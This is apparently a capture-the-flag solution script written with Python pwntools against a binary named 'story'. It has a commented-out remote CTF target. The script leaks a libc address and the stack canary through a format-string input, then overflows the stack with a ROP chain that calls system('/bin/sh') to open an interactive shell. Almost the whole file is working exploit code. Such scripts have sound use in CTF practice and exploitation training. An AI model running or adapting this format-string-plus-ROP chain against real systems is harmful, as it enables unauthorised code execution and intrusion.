
''

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

def g():
    gdb.attach(p)
    raw_input()


if __name__ == '__main__':
	elf=ELF("./libc-2.23.so")
	p=process("./story")
	#p=remote("ctf3.linkedbyx.com",11326)
        p.recvuntil("Please Tell Your ID:")
	p.sendline("%11$p%15$p")
        p.recvuntil("Hello ")


        data=p.recvline()
        libc=int(data[0:14],16)-0x78439
        print "libc :"+hex(libc)
        system=libc+elf.symbols["system"]
        print "system :"+hex(system)
        binsh = libc+next(elf.search('/bin/sh'))
	canary = int(data[14:32],16)
        print "canary :"+hex(canary)

	p.recvuntil("Tell me the size of your story:\n")
	p.sendline(str(129))

	p.recvuntil("You can speak your story:\n")  

        poprdi_ret=0x0000000000400bd3
        rop=p64(poprdi_ret)+p64(binsh)+p64(system)
        p.sendline("a"*0x88+p64(canary)+p64(0)+rop)

        p.interactive()  
